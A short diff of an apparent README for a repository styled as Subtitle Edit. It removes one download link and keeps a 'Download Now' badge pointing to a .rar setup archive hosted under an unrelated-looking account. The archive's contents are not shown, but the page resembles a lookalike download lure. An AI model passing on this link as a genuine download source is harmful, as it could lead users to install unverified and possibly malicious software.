@@ -18,8 +18,6 @@
 
 
 
-### [⬇️ Download](https://github.com/nucleusmotormancoil/subtitle-edit/releases/download/SubtitleEdit/SubtitleEdit-Setup.rar)
-
 [![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/nucleusmotormancoil/subtitle-edit/releases/download/SubtitleEdit/SubtitleEdit-Setup.rar).
 
 
